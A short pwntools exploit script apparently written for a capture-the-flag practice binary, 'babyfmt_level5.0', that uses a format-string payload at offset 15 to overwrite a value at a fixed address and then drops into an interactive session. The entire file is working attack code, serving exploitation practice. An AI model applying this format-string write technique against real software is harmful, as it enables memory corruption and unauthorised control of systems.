from pwn import *

context(arch="amd64", os="linux", log_level="info")
io = process("./babyfmt_level5.0")

target_Addr = 0x404160
write = 0xF6943A3523FD282C
pad = b"a" * 6
# offset : 15
# payload = b'AAAAAABBBBBBBB' + b' %p' * 20

payload = pad + fmtstr_payload(15, {target_Addr: write}, numbwritten=6)
io.send(payload)
io.interactive()
